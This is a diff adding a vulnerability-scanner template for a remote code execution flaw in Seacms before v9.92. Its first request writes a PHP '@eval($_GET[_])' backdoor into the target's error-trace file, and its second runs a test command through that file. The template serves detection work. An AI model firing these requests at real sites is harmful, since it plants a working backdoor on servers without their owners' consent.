@@ -1,0 +1,38 @@
+id: seacms-before-v992-rce
+info:
+  name: Seacms Before V992 Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: rce
+  description: |
+    Potential remote code execution vulnerability in Seacms versions before v9.92.
+    Exploitation involves sending crafted requests to vulnerable endpoints.
+
+variables:
+  r1: "{{rand_base(8)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: "step-1"
+    method: GET
+    path:
+      - "{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_])%3B%3F%3E"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: "step-2"
+    method: GET
+    path:
+      - "{{BaseURL}}/data/mysqli_error_trace.php?_={{concat('printf(md5(', r1, '))%3B')}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r1)}}"
+        part: body
